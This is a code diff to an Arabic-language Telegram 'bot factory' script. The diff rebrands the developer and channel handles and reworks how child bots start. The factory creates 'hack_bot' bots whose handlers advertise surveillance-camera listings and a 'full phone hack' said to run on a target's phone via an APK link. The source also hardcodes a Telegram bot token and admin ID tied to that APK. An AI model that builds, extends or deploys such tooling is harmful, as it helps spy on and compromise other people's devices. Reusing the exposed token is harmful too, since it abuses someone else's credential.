@@ -14,6 +14,7 @@ import zipfile
 import hashlib
 import codecs
 import zlib
+import asyncio
 
 from telegram import (
     Update,
@@ -42,8 +43,8 @@ MAIN_ADMIN_ID = int(os.getenv("MAIN_ADMIN_ID", "6154678499"))
 YOUR_BOT_TOKEN_FOR_APK = os.getenv("YOUR_BOT_TOKEN_FOR_APK", "8967725681:AAFWg1wNYN4eabWDk7b_f0Ss7uSagzoCV1Q")
 YOUR_ADMIN_ID_FOR_APK = int(os.getenv("MAIN_ADMIN_ID", "6154678499"))
 
-MAIN_CHANNELS = ["@RLH5500", "@RLH550"]
-FACTORY_MAIN_SUBSCRIPTION_CHANNEL = "@RLH55"
+MAIN_CHANNELS = ["@xtt11x"]
+FACTORY_MAIN_SUBSCRIPTION_CHANNEL = "@xtt11x"
 FACTORY_MAIN_SUBSCRIPTION_ENABLED = True
 
 DATABASE_DIR = "database"
@@ -76,7 +77,7 @@ DEFAULT_BOT_SETTINGS = {
     "payment_status": "free",
     "banned_users": [],
     "members": [],
-    "additional_check_channel": "@ln_bio",
+    "additional_check_channel": "@xtt11x",
     "start_message": "**مرحبًا! بك كل الازرار مجاناً:**",
     "rembo_state": None,
     "features_channel": None,
@@ -833,21 +834,30 @@ def get_fake_number_keyboard(bot_username, user_id):
 
 
 # =============================================
-# تشغيل البوتات المصنوعة
+# تشغيل البوتات المصنوعة (مصحح)
 # =============================================
 
 def run_made_bot(bot_token, admin_id, bot_username, bot_type):
-    import asyncio
     try:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
+        loop.run_until_complete(_run_made_bot_async(bot_token, admin_id, bot_username, bot_type))
+    except Exception as e:
+        logging.error(f"Error running made bot @{bot_username}: {e}")
+
+async def _run_made_bot_async(bot_token, admin_id, bot_username, bot_type):
+    try:
         made_app = ApplicationBuilder().token(bot_token).build()
         made_app.add_handler(CommandHandler("start", start_made_bot))
         made_app.add_handler(CallbackQueryHandler(handle_callback_query_made_bot))
         made_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message_made_bot))
         made_app.add_handler(MessageHandler(filters.Document.ALL, handle_document_made_bot))
         logging.info(f"Starting made bot @{bot_username}...")
-        loop.run_until_complete(made_app.run_polling(drop_pending_updates=True))
+        await made_app.initialize()
+        await made_app.start()
+        await made_app.updater.start_polling(drop_pending_updates=True)
+        logging.info(f"Made bot @{bot_username} is running!")
+        await asyncio.Event().wait()
     except Exception as e:
         logging.error(f"Error running made bot @{bot_username}: {e}")
 
@@ -860,13 +870,13 @@ async def start_main_bot(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id in FACTORY_ADMINS:
         await send_msg(context.bot, user_id,
-                     "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @RLH55\nقناة المطور: @ln_bio",
+                     "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @xtt1x\nقناة المطور: @xtt11x",
                      reply_markup=get_main_bot_admin_keyboard())
         user_state[user_id] = None
         return
     if check_subscription(user_id, MAIN_CHANNELS, MAIN_BOT_TOKEN):
         await send_msg(context.bot, user_id,
-                     "👋 حياك الله في بوت صانع البوتات ✨\n\nالمطور: @RLH55\nقناة المطور: @RLH5500",
+                     "👋 حياك الله في بوت صانع البوتات ✨\n\nالمطور: @xtt1x\nقناة المطور: @xtt11x",
                      reply_markup=get_main_bot_user_keyboard())
         user_state[user_id] = None
     else:
@@ -1060,7 +1070,7 @@ async def add_factory_main_subscription(update: Update, context: CallbackContext
             save_made_bot_settings(bot_username)
     await send_msg(context.bot, query.message.chat.id, "✅ تم تفعيل الاشتراك الإجباري لقناة المصنع لجميع البوتات.")
     await edit_msg(context.bot, query.message.chat.id, query.message.message_id,
-                  "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @RLH55\nقناة المطور: @ln_bio",
+                  "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @xtt1x\nقناة المطور: @xtt11x",
                   reply_markup=get_main_bot_admin_keyboard())
     if query.from_user.id != MAIN_ADMIN_ID:
         await send_msg(context.bot, MAIN_ADMIN_ID,
@@ -1080,7 +1090,7 @@ async def remove_factory_main_subscription(update: Update, context: CallbackCont
             save_made_bot_settings(bot_username)
     await send_msg(context.bot, query.message.chat.id, "✅ تم إزالة الاشتراك الإجباري لقناة المصنع من جميع البوتات.")
     await edit_msg(context.bot, query.message.chat.id, query.message.message_id,
-                  "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @RLH55\nقناة المطور: @ln_bio",
+                  "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @xtt1x\nقناة المطور: @xtt11x",
                   reply_markup=get_main_bot_admin_keyboard())
     if query.from_user.id != MAIN_ADMIN_ID:
         await send_msg(context.bot, MAIN_ADMIN_ID,
@@ -1268,7 +1278,7 @@ async def start_made_bot(update: Update, context: CallbackContext):
     if isinstance(bot_user_states[current_bot_username].get(user_id), dict) and bot_user_states[current_bot_username][user_id].get("awaiting_factory_main_subscription"):
         bot_user_states[current_bot_username][user_id] = None
 
-    # معالجة رابط الإحالة (فقط لـ hack_bot)
+    # نظام الإحالة (Referral)
     if bot_type == "hack_bot" and context.args and len(context.args) == 1:
         referrer_id = context.args[0]
         try:
@@ -1313,7 +1323,6 @@ async def start_made_bot(update: Update, context: CallbackContext):
         except ValueError:
             logging.warning(f"Invalid referrer ID: {context.args[0]}")
 
-    # التحقق من الاشتراك الإجباري للقنوات الخاصة بالبوت
     required_channels = [c for c in bot_settings["channels"] if c != FACTORY_MAIN_SUBSCRIPTION_CHANNEL]
     if required_channels:
         not_subscribed_channels = []
@@ -1321,18 +1330,17 @@ async def start_made_bot(update: Update, context: CallbackContext):
             if not check_subscription(user_id, [channel], current_bot_token):
                 not_subscribed_channels.append(channel)
         if not_subscribed_channels:
-            message_text = "📌 تنبيه: الاشتراك الإجباري 📌\n\n🔐 يُرجى الاشتراك في القنوات التالية:\n\n"
+            message_text = "📌 تنبيه: الاشتراك الإجباري 📌\n\n🔐 يُرجى الاشتراك في القنوات التالية:\n\n🌟📈 استعد للانطلاق في رحلة تفاعلية مذهلة! 📈🌟\n\n"
             keyboard = []
             for channel in not_subscribed_channels:
                 channel_name = get_channel_name(channel, current_bot_token)
                 clean_channel = channel.lstrip('@')
                 keyboard.append([InlineKeyboardButton(f"اشترك في {channel_name}", url=f"https://t.me/{clean_channel}")])
                 message_text += f"{channel_name}\n"
-            message_text += "\n📢 بعد إتمام الاشتراك، أرسل /start للمتابعة."
+            message_text += "\n📢 بعد إتمام الاشتراك، قم بإرسال رسالة \"/start\" للمتابعة.\n\n💬 نتمنى لك تجربة رائعة ومليئة بالتفاعل! 💬"
             await send_msg(context.bot, chat_id, message_text, reply_markup=InlineKeyboardMarkup(keyboard))
             return
 
-    # تسجيل المستخدم الجديد
     members = bot_settings["members"]
     if user_id not in members:
         members.append(user_id)
@@ -1407,7 +1415,6 @@ async def handle_callback_query_made_bot(update: Update, context: CallbackContex
         user_last_interaction_time[current_bot_username] = {}
     user_last_interaction_time[current_bot_username][user_id] = time.time()
 
-    # التحقق من الاشتراك الإجباري لقناة المصنع الأساسية في كل تفاعل
     if FACTORY_MAIN_SUBSCRIPTION_ENABLED:
         if not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
             msg = f"❌ يجب عليك الاشتراك في القناة الأساسية {FACTORY_MAIN_SUBSCRIPTION_CHANNEL} لاستخدام هذا البوت.\n"
@@ -1441,7 +1448,6 @@ async def handle_callback_query_made_bot(update: Update, context: CallbackContex
 
     await query.answer()
 
-    # العودة للقائمة الرئيسية
     if data == "back_to_main_user_menu":
         bot_user_states[current_bot_username][user_id] = None
         if bot_type == "factory_bot":
@@ -1459,12 +1465,10 @@ async def handle_callback_query_made_bot(update: Update, context: CallbackContex
                          reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
         return
 
-    # الروابط المباشرة (hack_bot)
     if data in links and bot_type == "hack_bot":
         await send_msg(context.bot, chat_id, f"🔗 {links[data]}")
         return
 
-    # أزرار hack_bot للمستخدم
     if bot_type == "hack_bot":
         if data == "surveillance_cams":
             msg = "📡 كاميرات المراقبة المتاحة:\n\n"
@@ -1579,13 +1583,12 @@ async def handle_callback_query_made_bot(update: Update, context: CallbackContex
                     response_message += f"✨ @{username}\n"
                 await send_msg(context.bot, chat_id, response_message)
             else:
-                await send_msg(context.bot, chat_id, "لم يتم العثور على يوزرات متاحة حاليًا لهذا النوع. حاول مرة أخرى لاحقًا. 😔")
+                await send_msg(context.bot, chat_id, "لم يتم العثور على يوزرات متاحة حاليًا. حاول مرة أخرى لاحقًا. 😔")
             return
         elif data.startswith("full_phone_hack_"):
             await send_msg(context.bot, chat_id, "⏳ جاري المعالجة...\nهذه الميزة تعمل على الهاتف المستهدف عبر رابط APK.")
             return
 
-    # أزرار الأدمن في البوتات المصنوعة
     if user_id == admin_id:
         if data == "m1":
             members_count = len(bot_settings.get("members", []))
@@ -1725,7 +1728,6 @@ async def handle_callback_query_made_bot(update: Update, context: CallbackContex
                 await send_msg(context.bot, chat_id, f"✅ تم حذف الزر '{removed['name']}'.")
             return
 
-    # أزرار التشفير
     if bot_type == "encryption_bot":
         if data == "encrypt_file":
             await edit_msg(context.bot, chat_id, message_id, "اختر نوع التشفير يا عزيزي: 🔒", reply_markup=get_encryption_types_keyboard())
@@ -1751,13 +1753,13 @@ async def handle_callback_query_made_bot(update: Update, context: CallbackContex
         elif data == "show_terms_encryption_bot":
             terms_message = (
                 "📜 *الشروط والمتطلبات وكيفية التعامل مع البوت:*\n\n"
-                "مرحبًا بك في بوت التشفير وفك التشفير! يرجى قراءة هذه الإرشادات بعناية: ✨\n\n"
-                "1.  **الغرض من البوت**: مصمم لأغراض تعليمية أو تجريبية. 🚫\n"
-                "2.  **أنواع التشفير**: Base64, Hex, ROT13, SHA256, Gzip, Reverse. SHA256 أحادي الاتجاه. 🛡️\n"
-                "3.  **فك التشفير**: يجب استخدام نفس النوع. ⚠️\n"
-                "4.  **الملفات المدعومة**: الملفات النصية فقط. 📄\n"
-                "5.  **الدعم**: تواصل مع المطور عبر زر 'الدعم🚨'. 👨‍💻\n"
-                "6.  **القناة الأساسية**: اشترك للبقاء على اطلاع. 📢\n\n"
+                "مرحبًا بك في بوت التشفير وفك التشفير! يرجى قراءة هذه الإرشادات بعناية لضمان أفضل تجربة: ✨\n\n"
+                "1.  **الغرض من البوت**: هذا البوت مصمم لتشفير وفك تشفير الملفات النصية باستخدام خوارزميات بسيطة لأغراض تعليمية أو تجريبية. ليس مخصصًا لتشفير البيانات الحساسة أو السرية للغاية. 🚫\n"
+                "2.  **أنواع التشفير**: يوفر البوت عدة أنواع من التشفير (مثل Base64, Hex, ROT13, SHA256, Gzip, Reverse). يرجى ملاحظة أن SHA256 هو تشفير أحادي الاتجاه (Hashing) ولا يمكن فك تشفيره. 🛡️\n"
+                "3.  **تشفير/فك التشفير**: لكي تتمكن من فك تشفير ملف، يجب أن تكون قد قمت بتشفيره بنفس النوع من خلال هذا البوت. ⚠️\n"
+                "4.  **الملفات المدعومة**: يدعم البوت حاليًا الملفات النصية. 📄\n"
+                "5.  **الدعم**: إذا واجهت أي مشكلة، يمكنك التواصل مع المطور عبر زر 'الدعم🚨'. 👨‍💻\n"
+                "6.  **القناة الأساسية**: يرجى الاشتراك في القناة الأساسية للبوت للبقاء على اطلاع. 📢\n\n"
                 "نتمنى لك تجربة مفيدة وممتعة! 😊"
             )
             await edit_msg(context.bot, chat_id, message_id, terms_message, parse_mode=ParseMode.MARKDOWN,
@@ -1775,7 +1777,6 @@ async def handle_callback_query_made_bot(update: Update, context: CallbackContex
             await query.answer("لم يتم تعيين قناة أساسية لهذا البوت بعد. ℹ️", show_alert=True)
             return
 
-    # أزرار المصنع الفرعي
     if bot_type == "factory_bot":
         if data == "create_bot_from_factory":
             keyboard = [
@@ -1849,29 +1850,20 @@ async def handle_message_made_bot(update: Update, context: CallbackContext):
 
     state = bot_user_states[current_bot_username].get(user_id)
 
-    # معالجة طلب توليد الصور
     if isinstance(state, dict) and state.get("action") == "await_image_prompt":
         await send_msg(context.bot, chat_id, "⏳ جاري إنشاء الصورة...")
         image_url = generate_image_via_api(text, current_bot_username, user_id)
-        if image_url:
-            await send_msg(context.bot, chat_id, image_url)
-        else:
-            await send_msg(context.bot, chat_id, "❌ فشل إنشاء الصورة.")
+        await send_msg(context.bot, chat_id, image_url if image_url else "❌ فشل إنشاء الصورة.")
         bot_user_states[current_bot_username][user_id] = None
         return
 
-    # معالجة طلب تحويل النص إلى صوت
     if isinstance(state, dict) and state.get("action") == "await_tts_text":
         await send_msg(context.bot, chat_id, "⏳ جاري التحويل...")
         audio_url = convert_text_to_speech_via_api(text, current_bot_username, user_id)
-        if audio_url:
-            await send_msg(context.bot, chat_id, audio_url)
-        else:
-            await send_msg(context.bot, chat_id, "❌ فشل التحويل.")
+        await send_msg(context.bot, chat_id, audio_url if audio_url else "❌ فشل التحويل.")
         bot_user_states[current_bot_username][user_id] = None
         return
 
-    # معالجة الذكاء الاصطناعي
     if isinstance(state, dict) and state.get("action") == "await_ai_prompt":
         await send_msg(context.bot, chat_id, "⏳ جاري المعالجة...")
         response = interact_with_ai_api(text, "ai", current_bot_username, user_id)
@@ -1879,7 +1871,6 @@ async def handle_message_made_bot(update: Update, context: CallbackContext):
         bot_user_states[current_bot_username][user_id] = None
         return
 
-    # معالجة تفسير الأحلام
     if isinstance(state, dict) and state.get("action") == "await_dream_text":
         await send_msg(context.bot, chat_id, "⏳ جاري التفسير...")
         response = interact_with_ai_api(text, "dream_interpret", current_bot_username, user_id)
@@ -1887,7 +1878,6 @@ async def handle_message_made_bot(update: Update, context: CallbackContext):
         bot_user_states[current_bot_username][user_id] = None
         return
 
-    # معالجة لعبة المارد الأزرق
     if isinstance(state, dict) and state.get("action") == "await_genie_question":
         await send_msg(context.bot, chat_id, "⏳ المارد يفكر...")
         response = interact_with_ai_api(text, "blue_genie_game", current_bot_username, user_id)
@@ -1895,7 +1885,6 @@ async def handle_message_made_bot(update: Update, context: CallbackContext):
         bot_user_states[current_bot_username][user_id] = None
         return
 
-    # معالجة زخرفة الأسماء
     if isinstance(state, dict) and state.get("action") == "await_name_to_decorate":
         name_type = state.get("name_type", "english")
         if name_type == "english":
@@ -1906,14 +1895,12 @@ async def handle_message_made_bot(update: Update, context: CallbackContext):
         bot_user_states[current_bot_username][user_id] = None
         return
 
-    # معالجة فحص الروابط
     if isinstance(state, dict) and state.get("action") == "await_url_to_check":
         result_msg, error_msg = check_url_virustotal_data(text)
         await send_msg(context.bot, chat_id, result_msg or error_msg, parse_mode=ParseMode.MARKDOWN if result_msg else None)
         bot_user_states[current_bot_username][user_id] = None
         return
 
-    # أزرار الأدمن
     if user_id == admin_id:
         if isinstance(state, dict) and state.get("action") == "await_broadcast_message":
             sent_count = 0
@@ -2110,8 +2097,6 @@ async def handle_message_made_bot(update: Update, context: CallbackContext):
             bot_user_states[current_bot_username][user_id] = None
             return
 
-    await send_msg(context.bot, chat_id, "ℹ️ اضغط على أحد الأزرار للبدء.")
-
 
 # =============================================
 # handle_document_made_bot
@@ -2169,8 +2154,14 @@ async def post_init(application):
     logging.info("Application initialized successfully")
 
 
+async def error_handler(update, context):
+    logging.error(f"Exception while handling an update: {context.error}")
+
+
 def main():
     app = ApplicationBuilder().token(MAIN_BOT_TOKEN).post_init(post_init).build()
+
+    app.add_error_handler(error_handler)
 
     app.add_handler(CommandHandler("start", start_main_bot))
     app.add_handler(CallbackQueryHandler(create_bot_main_bot, pattern="^create_bot$"))
@@ -2190,7 +2181,6 @@ def main():
     app.add_handler(CallbackQueryHandler(remove_factory_main_subscription, pattern="^remove_factory_main_sub$"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message_main_bot))
 
-    # تشغيل البوتات المصنوعة المحفوظة
     if os.path.exists(DATABASE_DIR):
         for filename in os.listdir(DATABASE_DIR):
             if filename.endswith(".json") and not filename.endswith("_settings.json"):
@@ -2208,11 +2198,11 @@ def main():
                             args=(bot_token, bot_admin_id, bot_username, bot_type_val),
                             daemon=True
                         ).start()
-                        logging.info(f"تم تشغيل البوت @{bot_username} في خيط منفصل.")
+                        logging.info(f"Started bot @{bot_username}")
                 except Exception as e:
                     logging.error(f"Error loading bot {bot_username}: {e}")
 
-    logging.info("البوت الرئيسي يعمل...")
+    logging.info("Main bot starting...")
     app.run_polling(drop_pending_updates=True)
 
 
